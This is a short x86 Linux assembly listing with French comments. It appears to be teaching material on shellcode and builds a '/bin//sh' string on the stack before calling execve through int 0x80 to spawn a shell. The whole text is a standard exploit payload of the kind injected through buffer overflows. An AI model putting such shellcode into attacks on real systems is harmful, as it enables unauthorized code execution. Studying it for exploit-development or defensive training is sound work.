section .text
global _start

_start:
    xor    eax,eax                    ; eax = 0

    push   eax                        ; empile \0
    push   0x68732f2f                 ; empile "//sh"
    push   0x6e69622f                 ; empile "/bin"
    mov    ebx,esp                    ; ebx = adresse de "/bin//sh"

    push   eax                        ; argv[1] = NULL
    push   ebx                        ; argv[0] = adresse de "/bin//sh"
    mov    ecx,esp                    ; ecx = adresse de argv

    mov    eax,0xb                    ; eax = numéro du syscall execve
    int    0x80                       ; syscall

